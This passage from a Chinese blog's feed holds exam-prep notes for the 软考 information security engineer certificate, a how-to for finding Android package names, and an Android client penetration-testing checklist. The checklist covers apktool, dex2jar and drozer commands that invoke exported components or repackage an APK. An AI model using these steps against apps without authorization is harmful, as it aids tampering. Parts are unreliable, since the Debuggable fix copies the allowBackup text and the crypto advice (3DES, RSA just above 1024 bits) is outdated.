ISMS)</li><li>系统安全工程能力成熟度模型(简称 SSE-CMM)</li></ul><h1 id="法律与政策文件"><a href="#法律与政策文件" class="headerlink" title="法律与政策文件"></a>法律与政策文件</h1><ul><li>《中华人民共和国网络安全法》：2017年6月1日</li><li>《中华人民共和国密码法》： 2020 年1月1日</li></ul><p>采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于<strong>六个月</strong></p><ul><li><p>等级保护的主要工作</p><ul><li>定级：确认定级对象，确定合适级别，通过专家评审和主管部门审核;</li><li>备案：按等级保护管理规定准备备案材料，到当地公安机关备案和审核</li><li>建设整改：依据相应等级要求对当前保护对象的实际情况进行差距分析，针对不符合项结合行业要求对保护对象进行整改，建设符合等级要求的安全技术和管理体系</li><li>等级测评：等级保护测评机构依据相应等级要求，对定级的保护对象进行测评并出具相应的等级保护测评证书;</li><li>运营维护工作是指等级保护运营主体按照相应等级要求，对保护对象的安全相关事宜进行监督管理。</li></ul></li><li><p>中国网络安全审查技术与认证中心（CCRC，原中国信息安全认证中心）是负责实施网络安全审查和认证的专门机构。</p></li><li><p>国家计算机网络应急技术处理协调中心（简称”国家互联网应急中心”，英文缩写为 CNCERT或 CNCERT&#x2F;CC）是中国计算机网络应急处理体系中的头单位，是国家级应急中心。CNCERT 的主要职责是：按照”积极预防、及时发现、快速响应、力保恢复”的方针，开展互联网网络安全事件的预防、发现、预警和协调处置等工作，维护公共互联网安全，保障关键信息基础役施的安全运行。</p></li></ul><h1 id="信息获取来源"><a href="#信息获取来源" class="headerlink" title="信息获取来源"></a>信息获取来源</h1><ul><li>安全会议：四大顶级学术会议S&amp;P、CCS、NDSS USENIX Security</li><li>网络安全期刊</li><li>网络安全网站</li><li>网络安全术语<ul><li>基础技术类：密码。加密(encryption)、解密(decryption)、非对称加密算法(asymmetric cryptographic algorithm)、公钥加密算法 (public key cryptographic algorithm)、公钥 (public key) 等。</li><li>风险评估技术类：拒绝服务(DeDiad of Service)、分布式拒绝服务(DstibedDenial of Service)、网页篡改 (Website Distortion)、网页仿冒 (Phishing)、网页挂马 (Website Malicious Code)、域名劫持(DNS Hijack)、路由劫持 (Routing Hijack)、网络蠕虫(Network Worm)、垃圾邮件 (Spam)、恶意代码(Malicious Code)、特洛伊木马(Trojan Horse)、僵尸网络 (Bot Net)等。</li><li>防护技术类：访问控制 (Access Control)、入侵防御系统(Intrusion Prevention System)、防火墙(Firewall)等。</li><li>检测技术类：入侵检测(Intrusion Detection)、漏洞扫描(Vulnerability Scanning)</li><li>响应恢复技术类：应急响应(Emergency Response )、灾难恢复 (Disaster Recovery)、备份(Backup)</li><li>测评技术类等：黑盒测试(Black Box Testing)、白盒测试 (White Box Testing)、灰盒测试(Gray Box Testing)、渗透测试(Penetration Testing)、模糊测试(FuzzTesting)</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软考-信息安全工程师-备考笔记</title>
      <link href="/information-security-engineer/"/>
      <url>/information-security-engineer/</url>
      
        <content type="html"><![CDATA[<blockquote><p>2023.7.1日</p></blockquote><p>开此篇博客是为了记录自己准备软考的过程，比如：</p><ul><li>软考相关信息收集</li><li>备考笔记</li><li>一些碎碎念（想看我哔哔赖赖的请移步本文【碎碎念】part）</li></ul><p>希望2023年能顺利考下这个证书。</p><h1 id="关于软考-信息安全工程师"><a href="#关于软考-信息安全工程师" class="headerlink" title="关于软考-信息安全工程师"></a>关于软考-信息安全工程师</h1><p>1、什么是软考？<br>软考既是<strong>职业资格考试</strong>，又是<strong>职称资格考试</strong>，同时，还具有水平考试性质，是目前国内最具权威的计算机类考试，含金量最高，涉及面最广。</p><p>2、有哪些岗位<br>参考软考官网 <a href="https://www.ruankao.org.cn/platform">https://www.ruankao.org.cn/platform</a></p><p>3、科目怎么选？</p><ul><li>不建议考初级，软考可以越级考试</li><li>根据工作来选考试科目</li></ul><h2 id="含金量"><a href="#含金量" class="headerlink" title="含金量"></a>含金量</h2><p>1、职称评定。以考代评，通过即为中级职称。<br>2、积分落户。<br>3、抵扣个税。<br>4、升职加薪。<br>5、领取政府现金补贴。技能提升拿证后，即可申请领取补贴。<br>6、企业招投标加分。</p><h2 id="考试形式"><a href="#考试形式" class="headerlink" title="考试形式"></a>考试形式</h2><p>初级和中级都是考两门：</p><ul><li>基础知识（选择题：单选75题）</li><li>应用技术（问答题：4-6题）</li></ul><p>高级考三门：</p><ul><li>综合知识（选择题：单选75题）</li><li>案例分析（问答题：3题）</li><li>论文（2700字左右）</li></ul><h2 id="考试科目"><a href="#考试科目" class="headerlink" title="考试科目"></a>考试科目</h2><p>1、网络信息安全基础知识和技术</p><ul><li>150分钟（上午 9:00-11:30）</li><li>综合知识，75道选择题</li><li>75分</li></ul><p>2、网络信息安全工程与综合应用实践</p><ul><li>150分钟（下午 14:00-16:30）</li><li>案例分析，问答题，一般 4-5 道，每道试题 3-4 个问题</li><li>75分</li></ul><p><strong>官方参考书目：《信息安全工程师教程（第2版）》蒋建春主编</strong></p><h2 id="通过标准"><a href="#通过标准" class="headerlink" title="通过标准"></a>通过标准</h2><p>所有科目合格标准为试卷满分的60%(45分&#x2F;75分)合格<br>需一次性通过所有科目，考试成绩不保留</p><p>成绩查询：一般可于考试后三个月左右，登录<a href="http://www.ruankao.org.cn/">报名网站</a>进行成绩查询</p><h2 id="报名条件"><a href="#报名条件" class="headerlink" title="报名条件"></a>报名条件</h2><p>无</p><h2 id="报名时间"><a href="#报名时间" class="headerlink" title="报名时间"></a>报名时间</h2><p>软考每年有两次考试，分别安排在上半年和下半年。<br>每次考试时间略有不同，上半年考试时间为5月下旬，报名时间一般3月份开始；<br>下半年考试时间为11月上旬，报名时间一般在8月开始。<br>报名网站 <a href="https://bm.ruankao.org.cn/sign/welcome">https://bm.ruankao.org.cn/sign/welcome</a></p><h2 id="备考建议"><a href="#备考建议" class="headerlink" title="备考建议"></a>备考建议</h2><p>1、备考时间：3-5个月<br>通读一遍教材（1个月左右）——熟读教材和讲义——综合知识练习——案例分析题真题——论文写作（考前2个月）——考前冲刺。</p><p>2、需要完成的任务</p><ul><li>综合知识题库（知识点全覆盖）</li><li>历年真题练习（2016年-至今）</li><li>讲义（重点内容必看）</li><li>视频（仔细听讲+回看）</li></ul><p>3、一定要多看教材，多做题。考试会有很多概念题，还有一些分析题，这些要想全部做好，你的基础就得打牢。</p><p>4、上午题75道选择题，考试范围很广，下午题虽然是文字题，但其实每次就考那几个知识点，反而不用太担心。</p><p>5、最后冲刺阶段做几套模拟题，保证正确率在80%，基本上差不多了。</p><h2 id="证书查询"><a href="#证书查询" class="headerlink" title="证书查询"></a>证书查询</h2><p><a href="https://query.ruankao.org.cn/certificate/main">https://query.ruankao.org.cn/certificate/main</a></p><p><a href="http://www.cpta.com.cn/certQuery.html">http://www.cpta.com.cn/certQuery.html</a></p><h1 id="备考笔记"><a href="#备考笔记" class="headerlink" title="备考笔记"></a>备考笔记</h1><h2 id="一轮：章节归纳"><a href="#一轮：章节归纳" class="headerlink" title="一轮：章节归纳"></a>一轮：章节归纳</h2><ul><li><a href="https://jenchoi.tk/chapter1-information-security-overview">第1章：网络信息安全概述</a></li><li><a href="https://jenchoi.tk/chapter2-attack-priciples-and-methods">第2章：网络攻击原理与常用方法</a></li></ul><h2 id="二轮：知识精炼"><a href="#二轮：知识精炼" class="headerlink" title="二轮：知识精炼"></a>二轮：知识精炼</h2><h2 id="三轮：冲刺总结"><a href="#三轮：冲刺总结" class="headerlink" title="三轮：冲刺总结"></a>三轮：冲刺总结</h2><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><h2 id="为什么参加软考"><a href="#为什么参加软考" class="headerlink" title="为什么参加软考"></a>为什么参加软考</h2><p>1、应届生，安全行业没啥可考的证书，NISP太过于蹩脚，CISP还不够格，其他的细分领域还有待进一步确认，软考总体上是一个不错的选择，费用低，国家性考试，含金量尚可。</p><p>2、目前时间比较充裕，与其天天追剧，不如做点对未来有益的事情。</p><p>3、听国企、体制内的一些前辈提到这个考试，说有利于评职称，虽然不知道以后会不会进国企什么的，但考下来总归是有利无害的。</p><p>4、顺便借着此次考试，看看考试和实际工作的重点有何不一样。</p><p>5、开开眼，多了解下领域内的知识。</p><p>6、一直想多考点证书，各种各样的证书，以证促学。</p><h2 id="怎么安排自己的备考计划"><a href="#怎么安排自己的备考计划" class="headerlink" title="怎么安排自己的备考计划"></a>怎么安排自己的备考计划</h2><p>我是5月份回学校忙毕业事宜的时候，决定考这个证书。查了些资料，确定了今年下午会有一场信安的考试，于是决定备考，整起来。</p><p>6月12号返岗，陆陆续续学了两章，然后忙毕业转正的事情，中途又去黄山玩了一趟，耽搁了一两周。</p><p>今天是7月1号，对于备考的计划是：</p><ul><li>7月-8月上旬：完成一轮，把知识点快速的过一遍。（本月可能比较忙，刚到新项目上，要学的比较多，加之中途有10节游泳课，所以拖到8月上旬完成）</li><li>8月-9月：练习题+二轮</li><li>10月-11月考试：做题冲刺。</li></ul><p>不安排具体的，弹性完成，总感觉这项考试不需要我备考4个多月，中间估计会做挺多其他的事。</p>]]></content>
      
      
      <categories>
          
          <category> 自我提升 </category>
          
          <category> 考证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取安卓APP包名的方法</title>
      <link href="/how-to-obtain-app-package-name/"/>
      <url>/how-to-obtain-app-package-name/</url>
      
        <content type="html"><![CDATA[<h1 id="有apk包"><a href="#有apk包" class="headerlink" title="有apk包"></a>有apk包</h1><p><strong>手机查看方法：</strong></p><p>那肯定是用万能的MT管理器，哈哈哈哈哈</p><p>找到对应的apk包，点击查看，打开AndroidManifest文件（反编译），搜索 <code>package=</code>，后面的就是包名</p><img src="/img/image-20230701235959798.png" alt="image-20230701235959798" style="zoom:67%;" /><p><strong>电脑获取方法：</strong></p><p>和手机步骤一样，只不过要用APKTool来反编译</p><p>apkTool反编译，查看AndroidManifest文件，搜索 <code>package=</code>，后面的就是包名</p><h1 id="已安装，无apk包"><a href="#已安装，无apk包" class="headerlink" title="已安装，无apk包"></a>已安装，无apk包</h1><h2 id="无root"><a href="#无root" class="headerlink" title="无root"></a>无root</h2><p><strong>方法一：</strong></p><p>列出手机内所有apk对应的包名，一个个看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell pm list package</span><br></pre></td></tr></table></figure><p><strong>方法二：</strong></p><p> 需要先打开应用，再执行命令（不推荐，输出一大堆，看的眼花缭乱）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有包名</span></span><br><span class="line">adb shell dumpsys activity</span><br></pre></td></tr></table></figure><h2 id="已root"><a href="#已root" class="headerlink" title="已root"></a>已root</h2><p>&#x2F;data&#x2F;data 目录下有所有的安装包名</p><p>可以用adb切到该目录之后ls，也可以用MT管理器查看</p><p>推荐MT管理器查看，因为它会带一个应用的icon，adb比较难找</p><p><strong>参考文章</strong></p><p>1、<a href="https://www.jianshu.com/p/f6e8a03db025">获取APK包名的几种方法 - 简书</a></p><p>2、<a href="https://segmentfault.com/a/1190000040947631">爬虫 - 安卓逆向 05 app包名的获取 - 个人文章 - SegmentFault 思否</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓APP客户端渗透测试指南</title>
      <link href="/android-app-client-pentest-guide/"/>
      <url>/android-app-client-pentest-guide/</url>
      
        <content type="html"><![CDATA[<p>安卓APP的渗透测试，主要分为两个方面</p><ul><li><p><strong>客户端</strong>：安卓四大组件的安全性检测，简单来说就是一个个的检查项，看看是否符合要求</p></li><li><p><strong>服务端</strong>：APP和服务端交互的渗透测试，抓包检测，和Web渗透差不多</p></li></ul><p>本篇我们主要介绍Android客户端的渗透测试，重点放在：<strong>要测哪些项目，怎么测</strong>上面。我会一条条的列出相应的测试项，并给出在我认知内最简便的方法（如果大佬们有更好的方法，欢迎邮件与我讨论），供自己及其他同行参考。</p><h1 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具"></a>检测工具</h1><ul><li>dex2jar</li><li>APKTool</li><li>jd-gui：<a href="https://github.com/java-decompiler/jd-gui/releases">Releases · java-decompiler&#x2F;jd-gui</a></li></ul><h1 id="应用配置安全"><a href="#应用配置安全" class="headerlink" title="应用配置安全"></a>应用配置安全</h1><h2 id="开启AllowBackup属性"><a href="#开启AllowBackup属性" class="headerlink" title="开启AllowBackup属性"></a>开启AllowBackup属性</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>被测应用的AndroidManifest.xml文件中allowBackup属性值被设置为true，可通过adb backup对应用数据进行备份，在无root的情况下可以导出应用中存储的所有数据，造成用户数据泄露。</p><p><strong>检查工具：</strong>APKTool</p><p><strong>检查方法：</strong></p><p>1、使用APKTool对apk进行反编译（<strong>后续不再详述此步骤</strong>）</p><p>把要反编译的apk复制到APKTool目录下，cmd切到APKTool的目录</p><p>输入指令：<code>apktool.jar d test.apk</code></p><p>完成后，APKTool的目录下会多出一个和apk同名的文件夹</p><p>2、AndroidManifest.xml 文件中查看 allowBackup 属性，检查是否未设置或者被设置为true</p><blockquote><p>AndroidManifest.xml 文件在刚刚反编译出来的文件夹里</p></blockquote><p><img src="/./img/image-20230701135230263.png" alt="image-20230701135230263"></p><p><strong>整改意见：</strong>将参数android:allowBackup属性设置为false，防止数据泄漏</p><h2 id="开启Debuggable属性"><a href="#开启Debuggable属性" class="headerlink" title="开启Debuggable属性"></a>开启Debuggable属性</h2><p><strong>漏洞等级：中</strong></p><p><strong>风险分析：</strong>被测应用的AndroidManifest.xml文件中Debuggable属性值被设置为true时，可以设置断点来控制程序的执行流程，在应用程序运行时修改其行为，app存在被恶意程序调试的风险，可能导致泄漏敏感信息泄漏等问题。</p><p><strong>检查工具：</strong>APKTool</p><p><strong>检查方法：</strong></p><p>1、使用APKTool对apk进行反编译</p><p>2、AndroidManifest.xml 文件中查看 Debuggable 属性，检查是否未设置或者被设置为true</p><p><img src="/./img/image-20230701135254393.png" alt="image-20230701135254393"></p><p><strong>整改意见：</strong>将参数android:allowBackup属性设置为false，防止数据泄漏</p><h1 id="公共组件安全"><a href="#公共组件安全" class="headerlink" title="公共组件安全"></a>公共组件安全</h1><h2 id="WebView组件远程代码执行"><a href="#WebView组件远程代码执行" class="headerlink" title="WebView组件远程代码执行"></a>WebView组件远程代码执行</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>Android API level 16以及之前的版本存在远程代码执行安全漏洞，该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface 方法，远程攻击者可通过使用Java Reflection API利用该漏洞执行任意Java对象的方法，导致远程代码执行漏洞。</p><p><strong>检查工具：</strong>dex2jar、jd-gui</p><p><strong>检查方法：</strong></p><p>1、解压缩apk文件（apk和zip包一样，可以直接被解压缩。改成zip后缀再解压缩也是一样的），得到其中的classes.dex</p><p>2、把classed.dex复制到 dex2jar 的目录下，cmd运行 <code>dex2jar.bat classes.dex </code>，得到 classes_dex2jar.jar</p><p>3、使用 jd-gui 打开 classes_dex2jar.jar</p><p>4、全局搜索是否使用 addJavascriptInterface 方法</p><p>5、如果是 Android 4.2 之前版本，查看源代码中是否对addJavascriptInterface的输入参数进行过滤；如果是Android 4.2及之后版本，检查是否声明@JavascriptInterface来代替addjavascriptInterface</p><p><strong>整改意见：</strong></p><p>1、不使用 addJavascriptInterface 方法</p><p>2、若必须使用，则应对访问的url进行过滤限制或对html页面进行完整性校验，同时显示移除对指定的javascript接口的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">removeJavascriptInterface(searchBoxJavaBridge_);</span><br><span class="line">removeJavascriptInterface(accessibility);</span><br><span class="line">removeJavascriptInterface(accessibilityTraversal);</span><br></pre></td></tr></table></figure><p>3、采用@JavascriptInterface 代替 addjavascriptInterface</p><h2 id="Activity组件配置错误"><a href="#Activity组件配置错误" class="headerlink" title="Activity组件配置错误"></a>Activity组件配置错误</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>Activity是安卓应用组件，提供与用户进行交互的界面，如果应用对权限控制不当，攻击者可以绕过认证阶段，直接调用后续activity组件。</p><p><strong>检查工具：</strong>drozer</p><p><strong>检查方法：</strong></p><p>1、进入drozer（教程 <a href="https://jenchoi.tk/install-drozer-on-windows/">https://jenchoi.tk/install-drozer-on-windows/</a> ）</p><p>2、获取被测应用的包名（教程：<a href="htpps://jenchoi.tk/how-to-obtain-app-package-name">获取APP包名的方法</a>）</p><p>3、运行 <code>run app.activity.info –a  包名</code></p><img src="./img/image-20230701150922596.png" alt="image-20230701150922596" style="zoom:45%;" /><p>4、直接调用对应组件，看看是否能绕过app本身逻辑直接请求组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start --component 包名 组件名</span><br></pre></td></tr></table></figure><blockquote><p>组件名就是上面com.xxx.xxx.xxx.xxxActivity</p></blockquote><p><strong>整改意见：</strong></p><p>1、如果组件不需要与其他app共享数据或交互，请将该组件的exported的属性为“false”。如果组件需要与其他app共享数据或交互， 请对组件进行权限控制和参数校验。app内使用的私有Activity不应配置intent-filter，如果配置了intent-filter需设置exported属性为false</p><p>2、谨慎处理接收的intent以及其携带的信息，当Activity返回数据时候需注意目标Activity是否有泄露信息的风险</p><h2 id="Service组件暴漏"><a href="#Service组件暴漏" class="headerlink" title="Service组件暴漏"></a>Service组件暴漏</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>Service是Android中四大组件进行后台作业的主要组件，如果被测应用对权限控制不当，导致其他应用可以启动被测应用的Service。</p><p><strong>检查工具：</strong>drozer</p><p><strong>检查方法：</strong></p><p>方法一：drozer 执行 <code>run app.service.info -a &lt;packageName&gt;</code></p><p>方法二：直接检查AndroidManifest.xml 文件中的Services是否暴露</p><p><strong>整改意见：</strong></p><p>1、设置Service的android:exported 属性为 false</p><p>2、通过设置自定义权限来限制对Service的访问</p><h2 id="本地拒绝服务漏洞"><a href="#本地拒绝服务漏洞" class="headerlink" title="本地拒绝服务漏洞"></a>本地拒绝服务漏洞</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>android系统提供了activity、service和broadcastreceiver等组件，并提供了intent机制来协助应用间的交互与通讯，intent负责对应用中一次操作的动作动作涉及数据、附加数据进行描述，android系统则根据此intent的描述，负责找到对应的组件，将intent传递给调用的组件，并完成组件的调用。android应用本地拒绝服务漏洞源于程序没有对intent.getxxxextra0获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据、异常或者畸形数据来达到使该应用crash的目的，简单的说就是攻击者通过intent发送空数据、异常或畸形数据给受害者应用导致其崩溃。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、将不必要的组件设置为不导出，即在 AndroidMenifest.xml 中将相应组件的android:exported属性设为false</p><p>2、建议处理通过 intent.getxxxextra() 获取的数据时进行以下判断，以及用try catch方式进行捕获所有异常，以防止应用出现拒绝服务漏洞</p><pre><code> 1) 空指针异常 2) 类型转换异常 3) 数组越界访问异常 4) 类未定义异常 5) 其他异常</code></pre><h2 id="Broadcast组件拒绝服务"><a href="#Broadcast组件拒绝服务" class="headerlink" title="Broadcast组件拒绝服务"></a>Broadcast组件拒绝服务</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>如果用户输入合并到可动态执行的代码中，那么攻击者可以提交构造的输入，破坏原有的数据，指定服务器执行构造的命令</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、AndroidManifest.xml 文件的各 Receiver 标签中，设置android:exported&#x3D;”false”</p><p>2、Receiver 代码中增加消息异常处理机制。</p><h2 id="ContentProvider组件信息泄露"><a href="#ContentProvider组件信息泄露" class="headerlink" title="ContentProvider组件信息泄露"></a>ContentProvider组件信息泄露</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者可以利用开放的Content Provider 获取系统敏感资源</p><p><strong>检查工具：</strong>drozer</p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、AndroidManifest.xml文件的各Provider标签中，设置android;exported&#x3D;”false”</p><p>2、内部app通过ContentProvider交换数据，设置 protectionLevel&#x3D; “signature” 来验证签名</p><p>3、公开的 ContentProvider 确保不存储敏感数据</p><h2 id="ContentProvider组件SQL注入"><a href="#ContentProvider组件SQL注入" class="headerlink" title="ContentProvider组件SQL注入"></a>ContentProvider组件SQL注入</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>暴露的Provider组件，如果在 query() 中使用<strong>拼接</strong>字符串组成sql语句的形式去查询数据库，容易发生sql注入攻击。</p><p><strong>检查工具：</strong>无</p><p><strong>检查方法：</strong></p><p>1、AndroidManifest.xml 中查找Provider是否对外暴露（exported属性为true）</p><p>2、是否使用 query() 方法</p><p>3、SQL语句赋值来源是否为拼接字符串</p><p><strong>整改意见：</strong></p><p>1、不必要导出的Provider组件，建议显示设置组件的 android:exported 属性为 false</p><p>2、使用selectionArgs进行参数化查询</p><h2 id="content-provider目录遍历检测"><a href="#content-provider目录遍历检测" class="headerlink" title="content provider目录遍历检测"></a>content provider目录遍历检测</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>开发者为方便应用程序之间共享文件，会把实现了 openfile() 接口的content provider设置为导出状态，因此其他有相应调用该content provider权限的应用即可调用content provider的 openfile() 接口进行文件数据访问。但是如果没有进行content provider访问权限控制和对访问的目标文件的uri进行有效判断，攻击者利用文件目录遍历可访问任意可读文件，更有甚者可以往手机设备可写目录中写入任意数据。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、如果组件不需要与其他app共享数据或交互，请将androidmanifest.xml 配置文件中设置该组件为exported的属性为 “false”</p><p>2、如果组件需要与其他app共享数据或交互， 请对组件进行权限控制和参数校验</p><p>3、如果需要导出的话，严格编写过滤</p><h2 id="WebView域控制不严格漏洞"><a href="#WebView域控制不严格漏洞" class="headerlink" title="WebView域控制不严格漏洞"></a>WebView域控制不严格漏洞</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>当B应用的activity是可被导出的，同时设置允许WebView使用File协议，则A应用可以在外部调起B的Activity，同时向B传递一个请求内部数据的文件则可以获取B的数据。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、设置activity不可被导出</p><p>2、明确禁止WebView 使用 File 协议</p><h1 id="代码安全"><a href="#代码安全" class="headerlink" title="代码安全"></a>代码安全</h1><h2 id="代码未混滑"><a href="#代码未混滑" class="headerlink" title="代码未混滑"></a>代码未混滑</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>客户端代码未做混淆，。</p><p><strong>检查工具：</strong>dex2jar、jd-gui</p><p><strong>检查方法：</strong></p><p>1、dex2jar将classes.dex转成jar包</p><p>2、使用jd-gui打开jar包，查看代码是否混淆</p><blockquote><p> 代码混淆过后，在语意上难以通过直接查看代码理解</p></blockquote><p><strong>整改意见：</strong>对APP安装包进行加固，执行强混淆操作</p><h2 id="代码未加固"><a href="#代码未加固" class="headerlink" title="代码未加固"></a>代码未加固</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>客户端代码未做混淆和加固，使攻击者很轻易反编译出源代码，从而对应用程序逻辑进行分析。</p><p><strong>检查工具：</strong>MT管理器</p><p><strong>检查方法：</strong></p><p>使用MT管理器查看被测apk文件加固状态</p><img src="./img/image-20230701164937608.png" alt="image-20230701164937608" style="zoom:50%;" /><p><strong>整改意见：</strong>对app加商业壳</p><h2 id="二次编译打包"><a href="#二次编译打包" class="headerlink" title="二次编译打包"></a>二次编译打包</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者通过反编译后得到程序源代码，修改源码后，重新编译、签名并安装。在重新打包的过程中，攻击者可能注入恶意代码，或者修改软件逻辑绕过鉴权等。</p><p><strong>检查工具：</strong>APKTool、jarsigner、zipalign（可选）</p><p><strong>检查方法：</strong></p><p>1、使用APKToole对apk进行反编译</p><p>2、修改代码后，再次使用APKTool对apk进行打包</p><p><code>apktool b 文件夹 -o 新apk名.apk</code></p><p><strong>整改意见：</strong>内部代码实现apk二次打包鉴别机制，在程序运行时校验apk签名是否由官方私钥签名而来。</p><h2 id="Janus安卓签名漏洞"><a href="#Janus安卓签名漏洞" class="headerlink" title="Janus安卓签名漏洞"></a>Janus安卓签名漏洞</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者可以绕过安卓系统的signature scheme V1签名机制，进而直接对app进行篡改</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>app使用signature scheme V2及以上版本签名机制</p><h2 id="Root环境检测"><a href="#Root环境检测" class="headerlink" title="Root环境检测"></a>Root环境检测</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>在mobile 应用启用certificate pinning 的情况下使用Rooted 手机+xposed+justtrustme 组件依然可以通过API hook进行中间人攻击。 监控客户端与后台的通信内容。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、应用启动时检测手机环境，确保为非root环境</p><p>2、检测如xposed、 Cydia Substrate、frida等逆向工具是否运行时，弹窗提醒用户设备已root</p><h2 id="模拟器环境检测"><a href="#模拟器环境检测" class="headerlink" title="模拟器环境检测"></a>模拟器环境检测</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者可以用模拟器运行、多开、调试、攻击程序</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>在客户端代码中增加模拟器检测</p><h2 id="证书绑定"><a href="#证书绑定" class="headerlink" title="证书绑定"></a>证书绑定</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者通过替换证书解密客户端与服务端之间的数据</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>客户端应对服务端证书进行强验证</p><h2 id="代理环境检测"><a href="#代理环境检测" class="headerlink" title="代理环境检测"></a>代理环境检测</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者通过设置代理的方式，抓取客户端与服务器之间的数据包</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>客户端存在代理时停止通络通信，并提醒用户关闭代理</p><h1 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h1><h2 id="敏感信息硬编码"><a href="#敏感信息硬编码" class="headerlink" title="敏感信息硬编码"></a>敏感信息硬编码</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>如果类似密钥等敏感信息硬编码在源文件中，那么攻击者通过反编译程序代码，可以轻易获取这些敏感信</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>避免类似密钥，激活码等敏感信息直接硬编码在客户端源文件中。</p><h2 id="弱加密问题"><a href="#弱加密问题" class="headerlink" title="弱加密问题"></a>弱加密问题</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>使用弱加密算法会大大增加黑客攻击的概率，黑客可能会破解隐私数据、猜解密钥、中间人攻击等，造成隐私信息的泄漏，甚至造成财产损失</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、使用对称加密算法时避免使用DES算法，可以选择3DES</p><p>2、IvParameterSpec初始化时，不使用常量vector</p><p>3、使用 RSA 算法加密时，指定Padding模式，建议密钥长度&gt;1024 bit</p><h2 id="客户端敏感信息明文存储"><a href="#客户端敏感信息明文存储" class="headerlink" title="客户端敏感信息明文存储"></a>客户端敏感信息明文存储</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>敏感数据存储时应采取密文的形式，否则攻击者一旦获取数据，则直接获取明文的敏感信息。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>重要的敏感信息数据要通过加密方式存储，以避免被恶意截获</p><h2 id="日志中记录了泄露敏感信息"><a href="#日志中记录了泄露敏感信息" class="headerlink" title="日志中记录了泄露敏感信息"></a>日志中记录了泄露敏感信息</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>客户端日志文件中或者动态的调试日志中输出了敏感的系统信息，攻击者可能会窃取到这些敏感信息。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>日志文件中或者动态的调试日志中不应包含敏感信息</p><h2 id="本地数据库注入"><a href="#本地数据库注入" class="headerlink" title="本地数据库注入"></a>本地数据库注入</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>客户端程序在查询本地的Content Provider时通过构造特殊的查询语句，进而查询额外的敏感信息。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>过滤引起SQLite查询语句歧义的特殊字符，例如单引号、双引号、圆括号、分号 等</p><h2 id="WebView-密码明文存储漏洞"><a href="#WebView-密码明文存储漏洞" class="headerlink" title="WebView 